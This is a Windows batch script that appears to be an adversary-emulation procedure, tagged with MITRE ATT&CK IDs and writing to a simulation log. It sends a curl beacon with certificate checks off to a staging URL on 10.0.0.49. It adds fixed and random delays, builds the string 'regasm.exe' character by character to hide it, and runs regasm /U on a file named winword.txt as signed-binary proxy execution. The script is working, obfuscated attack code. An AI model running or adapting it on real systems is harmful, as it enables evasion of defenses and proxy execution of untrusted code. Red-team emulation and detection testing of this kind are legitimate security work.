@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR_ variables assigned to random names (plain literals)
SET gkhpqrl=%APPDATA%\8229\c633ec20
SET mrwbvgj=https://10.0.0.49
SET xcptzsf=https://10.0.0.49/stage/2/icon.png?8229-7
SET yfmdqts=ITZEL-S2BO
SET zkwbnjv=7
SET vcrphnm=winword.txt
SET tdqxjlk=8229

REM Log file path
SET lgflpth=%APPDATA%\!zkwbnjv!\macula-simulations.log

REM Start with initial delay
echo [!DATE! !TIME!][DEBUG][!yfmdqts!]: delay_start_initial=30s>>> "!lgflpth!" 2>nul
timeout /t 30 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!yfmdqts!]: delay_complete_initial>>> "!lgflpth!" 2>nul

REM Send heartbeat using direct PHR_ value
echo [!DATE! !TIME!][DEBUG][!yfmdqts!]: heartbeat_start>>> "!lgflpth!" 2>nul
curl -k -s -o nul "!xcptzsf!"
IF !ERRORLEVEL! EQU 0 (
    SET hbresult=1
    SET hberr=
) ELSE (
    SET hbresult=0
    SET hberr=connection_failed
)
echo [!DATE! !TIME!][DEBUG][!yfmdqts!]: heartbeat_complete_errorlevel=!ERRORLEVEL!>>> "!lgflpth!" 2>nul

REM Delay between operations
echo [!DATE! !TIME!][DEBUG][!yfmdqts!]: delay_start=15s>>> "!lgflpth!" 2>nul
ping -n 15 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!yfmdqts!]: delay_complete>>> "!lgflpth!" 2>nul

REM Obfuscate regasm.exe using character-by-character building
SET uqwrty=r
SET lkjhfg=e
SET mnbvxc=g
SET poiuzx=a
SET asdfgh=s
SET zxcvbn=m
SET qazwsx=.
SET edcrfv=e
SET rfvtgb=x
SET qscwed=e

SET rtyui=!uqwrty!!lkjhfg!!mnbvxc!!poiuzx!!asdfgh!!zxcvbn!
SET fghjk=!qazwsx!!edcrfv!!rfvtgb!!qscwed!
SET lkjnb=!rtyui!!fghjk!

REM Get full path to regasm.exe
FOR /F "tokens=*" %%i IN ('where !lkjnb!') DO SET fullpath=%%i
echo [!DATE! !TIME!][DEBUG][!yfmdqts!]: lolbin_resolved=!fullpath!>>> "!lgflpth!" 2>nul

REM Change to output directory
echo [!DATE! !TIME!][DEBUG][!yfmdqts!]: chdir_start=!gkhpqrl!>>> "!lgflpth!" 2>nul
cd /d "!gkhpqrl!"
IF !ERRORLEVEL! EQU 0 (
    SET cdresult=1
    SET cderr=
) ELSE (
    SET cdresult=0
    SET cderr=directory_not_found
)
echo [!DATE! !TIME!][DEBUG][!yfmdqts!]: chdir_complete_errorlevel=!ERRORLEVEL!>>> "!lgflpth!" 2>nul

REM Random delay
SET /A rnddelay=!RANDOM! %% 20 + 10
echo [!DATE! !TIME!][DEBUG][!yfmdqts!]: delay_random_start=!rnddelay!s>>> "!lgflpth!" 2>nul
timeout /t !rnddelay! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!yfmdqts!]: delay_random_complete>>> "!lgflpth!" 2>nul

REM Execute regasm.exe /U command
echo [!DATE! !TIME!][DEBUG][!yfmdqts!]: regasm_start_args=/U !vcrphnm!>>> "!lgflpth!" 2>nul
"!fullpath!" /U "!vcrphnm!"
IF !ERRORLEVEL! EQU 0 (
    SET execresult=1
    SET execerr=
) ELSE (
    SET execresult=0
    SET execerr=exitcode_!ERRORLEVEL!
)
echo [!DATE! !TIME!][DEBUG][!yfmdqts!]: regasm_complete_errorlevel=!ERRORLEVEL!>>> "!lgflpth!" 2>nul

REM Final delay
echo [!DATE! !TIME!][DEBUG][!yfmdqts!]: delay_final_start=10s>>> "!lgflpth!" 2>nul
CHOICE /C Y /N /D Y /T 10 >nul
echo [!DATE! !TIME!][DEBUG][!yfmdqts!]: delay_final_complete>>> "!lgflpth!" 2>nul

REM TTP logging for heartbeat (T1105)
FOR /F "tokens=2 delims==." %%t IN ('wmic os get localdatetime /value') DO SET datetime=%%t
SET ttptimestamp=!datetime:~0,4!-!datetime:~4,2!-!datetime:~6,2! !datetime:~8,2!:!datetime:~10,2!:!datetime:~12,2!.!datetime:~15,3!
echo [!ttptimestamp!][!yfmdqts!]: !zkwbnjv!-!tdqxjlk!-T1105|Ingress Tool Transfer=!hbresult!:!hberr!>> "!lgflpth!" 2>nul

REM TTP logging for directory change
FOR /F "tokens=2 delims==." %%t IN ('wmic os get localdatetime /value') DO SET datetime=%%t
SET ttptimestamp=!datetime:~0,4!-!datetime:~4,2!-!datetime:~6,2! !datetime:~8,2!:!datetime:~10,2!:!datetime:~12,2!.!datetime:~15,3!
echo [!ttptimestamp!][!yfmdqts!]: !zkwbnjv!-!tdqxjlk!-T1083|File and Directory Discovery=!cdresult!:!cderr!>> "!lgflpth!" 2>nul

REM TTP logging for regasm execution (T1218.009)
FOR /F "tokens=2 delims==." %%t IN ('wmic os get localdatetime /value') DO SET datetime=%%t
SET ttptimestamp=!datetime:~0,4!-!datetime:~4,2!-!datetime:~6,2! !datetime:~8,2!:!datetime:~10,2!:!datetime:~12,2!.!datetime:~15,3!
echo [!ttptimestamp!][!yfmdqts!]: !zkwbnjv!-!tdqxjlk!-T1218.009|Regasm=!execresult!:!execerr!>> "!lgflpth!" 2>nul

ENDLOCAL